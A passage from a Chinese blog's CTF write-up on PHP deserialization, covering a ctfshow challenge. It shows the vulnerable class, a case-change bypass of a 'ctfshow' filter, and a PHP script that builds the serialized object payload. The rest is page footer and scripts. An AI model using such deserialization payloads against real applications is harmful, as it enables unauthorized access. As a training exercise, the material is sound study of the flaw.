class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>依旧审计➡</p>
+<p>首先看见<code>php://input</code>，选择POST传参</p>
+<p>还是强等于，这里没有随机了，所以直接让<code>$username</code>和<code>$password</code>相等即可</p>
+<p>只是多了一个对ctfshow的过滤，这里考虑<strong>大小写绕过</strong>，因为<strong>PHP类名不区分大小写</strong></p>
+<p>编写代码➡</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cs</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CTFSHOW</span>();</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到payload</p>
+<p><code>O:7:&quot;CTFSHOW&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;&#125;</code></p>
+<p>直接hackbar post进去就可以（阿巴阿巴……不知道为什么出不来flag，可恶喵，步骤是没有问题的…）</p>
+
+    </div>
+    <footer class="article-footer">
+        <a data-aos="zoom-in" href="/2026/02/28/web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/#comments" class="article-comment-link">
+          <span class="post-comments-count valine-comment-count" data-xid="/2026/02/28/web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/" itemprop="commentCount"></span>
+          Comments
+        </a>
+        <span data-aos="zoom-in" id="/2026/02/28/web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/" class="leancloud_visitors article-visitor-link" data-flag-title="web做题日记之phar反序列化喵">
+          <span class="leancloud-visitors-count">0</span>
+          <em class="post-meta-item-text">Readings</em>
+        </span>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag" title="Web安全">Web安全</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/phar/" rel="tag" title="phar">phar</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag" title="反序列化">反序列化</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+          <img data-src="/images/19.jpg" data-sizes="auto" alt="web学习笔记之phar反序列化喵" class="lazyload">
+        <a href="/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/" aria-label="Prev: web学习笔记之phar反序列化喵" title="Prev: web学习笔记之phar反序列化喵"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+            web学习笔记之phar反序列化喵
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="https://d-sketon.top/img/_backwebp/bg1.webp" data-sizes="auto" alt="Hello World" class="lazyload">
+      <a href="/2026/02/28/hello-world/" aria-label="Next: Hello World"  title="Next: Hello World"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+          Hello World
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="valine">
+              <span>valine</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+        <div class="comment valine-comment" data-aos="fade-up"
+          id="valine-comment">
+        </div>
+    </div>
+  </section>
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+      <span class="footer-info-sep rotate"></span>
+      Gloria
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        30.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:21
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5"><span class="toc-number">1.</span> <span class="toc-text">web做题日记之反序列化喵</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-0%E5%96%B5%E5%96%B5%E5%96%B5"><span class="toc-number">1.1.</span> <span class="toc-text">1.0喵喵喵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-0%E5%96%B5%E5%96%B5%E5%96%B5%E5%96%B5"><span class="toc-number">1.2.</span> <span class="toc-text">2.0喵喵喵喵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-0%E5%96%B5%E5%96%B5"><span class="toc-number">1.3.</span> <span class="toc-text">3.0喵喵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-0-ctfshow-web259"><span class="toc-number">1.4.</span> <span class="toc-text">4.0 ctfshow-web259</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-0-cttfshow-web265"><span class="toc-number">1.5.</span> <span class="toc-text">5.0 cttfshow-web265</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-0-ctfshow-web266"><span class="toc-number">1.6.</span> <span class="toc-text">6.0 ctfshow-web266</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Gloria" class="lazyload">
+  <div class="sidebar-author-name">Gloria</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">15</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+</div>
+<div class="sidebar-social">
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+      window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+    }
+  </script>
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Gloria",
+          title: "web做题日记之phar反序列化喵",
+          url: "http://example.com/2026/02/28/web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/",
+          excerpt: "",
+          description: "",
+          stripContent: "web做题日记之反序列化喵[TOC] 1.0喵喵喵1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&amp;lt;?php/** * 挑战目标：构造一个 POP 链，最终执行 system(&amp;quot;whoami&amp;quot;) * * 假设这是目标服务器上的源代码 (source.php) */class Modifier &amp;#123;    protected $va",
+          date: "Sat Feb 28 2026 20:40:21 GMT+0800",
+          updated: "Sun Mar 08 2026 18:58:44 GMT+0800",
+          cover: "/images/22.jpg",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+        
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["valine"];
+  var commentConfig = {
+    valine: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.valine-comment');
+        if (!container) return;
+        if (container.style.display === 'block') return; // already loaded
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https://npm.webcache.cn/valine@1.5.1/dist/Valine.min.js',
+          'sha384-3ma91AExDeMAZ1rjTjaP8V2A2obQE+s5ltKRwYlwdpArz9xVbp0tF3b0VV2ACNPn'
+        );
+        script.onload = () => {
+          var GUEST_INFO = ['nick', 'mail', 'link'];
+          var guest_info = 'nick,mail,link'.split(',').filter((item) => {
+            return GUEST_INFO.indexOf(item) > -1
+          });
+          var recordIP = JSON.parse('true');
+          var highlight = JSON.parse('true');
+          var visitor = JSON.parse('true');
+          var serverURLs = undefined;
+
+          if (window.Valine) {
+            new Valine({
+              el: '.valine-comment',
+              appId: "kvVONbiLMyDuTRiZvZ1bTwdK-gzGzoHsz",
+              appKey: "3n0P97K1hXTVGGSYeh03GY57",
+              placeholder: "说点什么喵",
+              pageSize: '10',
+              avatar: 'mp',
+              lang: document.documentElement.lang || 'en',
+              recordIP: recordIP,
+              highlight: highlight,
+              visitor: visitor,
+              requiredFields: guest_info,
+              path: window.location.pathname,
+              serverURLs
+            });
+          }
+        };
+        document.head.appendChild(script);
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.10.4' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+  </body>
+  </html>
